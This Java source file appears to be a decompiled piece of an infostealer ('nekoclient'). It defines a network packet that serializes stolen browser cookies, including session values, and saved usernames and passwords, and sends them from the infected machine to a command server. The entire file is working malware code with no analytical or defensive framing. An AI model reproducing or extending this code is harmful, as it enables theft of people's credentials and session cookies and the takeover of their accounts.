package dev.neko.nekoclient.packet.impl.client;

import dev.neko.nekoclient.api.buffer.FriendlyByteBuffer;
import dev.neko.nekoclient.api.buffer.StreamByteBuffer;
import dev.neko.nekoclient.api.stealer.browser.BrowserData;
import dev.neko.nekoclient.api.stealer.browser.cookie.Cookie;
import dev.neko.nekoclient.api.stealer.browser.impl.credential.Credential;
import dev.neko.nekoclient.packet.Direction;
import dev.neko.nekoclient.packet.impl.NoncePacket;
import java.io.IOException;
import java.net.URL;

public class BrowserDataResponsePacket extends NoncePacket {
   private BrowserData browserData;

   public BrowserDataResponsePacket(String nonce, BrowserData browserData) {
      super(nonce);
      this.browserData = browserData;
   }

   public BrowserDataResponsePacket() {
   }

   @Override
   public void read(FriendlyByteBuffer buffer) throws IOException {
      super.read(buffer);
      this.browserData = new BrowserData();
      int cookiesLength = buffer.getInt();

      for(int i = 0; i < cookiesLength; ++i) {
         this.browserData
            .getCookies()
            .add(
               new Cookie(
                  buffer.getString(), buffer.getString(), buffer.getString(), buffer.getString(), buffer.getLong(), buffer.getBoolean(), buffer.getBoolean()
               )
            );
      }

      int credentialsLength = buffer.getInt();

      for(int i = 0; i < credentialsLength; ++i) {
         this.browserData.getCredentials().add(new Credential(new URL(buffer.getString()), buffer.getString(), buffer.getString()));
      }
   }

   @Override
   public void write(StreamByteBuffer buffer) throws IOException {
      super.write(buffer);
      buffer.putInt(this.browserData.getCookies().size());

      for(Cookie cookie : this.browserData.getCookies()) {
         buffer.putString(cookie.getHost());
         buffer.putString(cookie.getPath());
         buffer.putString(cookie.getName());
         buffer.putString(cookie.getValue());
         buffer.putLong(cookie.getExpires());
         buffer.putBoolean(cookie.isSecure());
         buffer.putBoolean(cookie.isHttpOnly());
      }

      buffer.putInt(this.browserData.getCredentials().size());

      for(Credential credential : this.browserData.getCredentials()) {
         buffer.putString(credential.getHost().toString());
         buffer.putString(credential.getUsername());
         buffer.putString(credential.getPassword());
      }
   }

   public final BrowserData getBrowserData() {
      return this.browserData;
   }

   @Override
   public Direction getDirection() {
      return Direction.CLIENT_TO_SERVER;
   }

   @Override
   public String getName() {
      return "browserdataresponse";
   }
}
